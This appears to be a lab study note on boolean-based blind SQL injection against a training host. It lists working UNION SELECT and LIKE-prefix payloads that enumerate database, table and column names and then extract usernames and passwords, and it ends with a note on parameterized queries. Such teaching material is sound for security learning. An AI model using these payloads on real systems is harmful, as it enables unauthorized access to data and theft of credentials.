# Boolean-Based Blind SQL Injection

Used on: **SQL Injection Fundamentals**

Boolean-based blind SQLi extracts data from a true/false signal. The page might only return `true` or `false`, but that single bit is enough to enumerate databases, tables, columns and values character by character.

## Prerequisites

- A vulnerable parameter affects a SQL query.
- The response changes reliably between true and false conditions.
- The attacker can iterate payloads without disruptive rate limits.

## Example Context

```text
https://website.thm/checkuserusername=admin
```

Observed true/false response:

```json
{"taken": true}
```

Query shape:

```sql
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```

## Steps

### 1. Find the column count

```sql
admin123' UNION SELECT 1;--
admin123' UNION SELECT 1,2;--
admin123' UNION SELECT 1,2,3;--
```

The first payload that flips the response to true identifies the valid column count.

### 2. Enumerate the database name

```sql
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```

Continue with prefixes such as `sa%`, `sb%`, `sc%` until the name is complete.

### 3. Enumerate tables

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables
WHERE table_schema = 'sqli_three' AND table_name LIKE 'a%';--
```

Confirm exact table names once a prefix is found:

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables
WHERE table_schema = 'sqli_three' AND table_name = 'users';--
```

### 4. Enumerate columns

```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS
WHERE TABLE_SCHEMA = 'sqli_three' AND TABLE_NAME = 'users' AND COLUMN_NAME LIKE 'a%';
```

Exclude known columns while searching for the next one:

```sql
AND COLUMN_NAME LIKE 'a%' AND COLUMN_NAME != 'id'
```

### 5. Extract values

```sql
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
admin123' UNION SELECT 1,2,3 FROM users WHERE username = 'admin' AND password LIKE 'a%';--
```

## Defensive Note

Parameterized queries remove the injection primitive. Generic true/false API responses do not protect a vulnerable query; they only slow extraction down.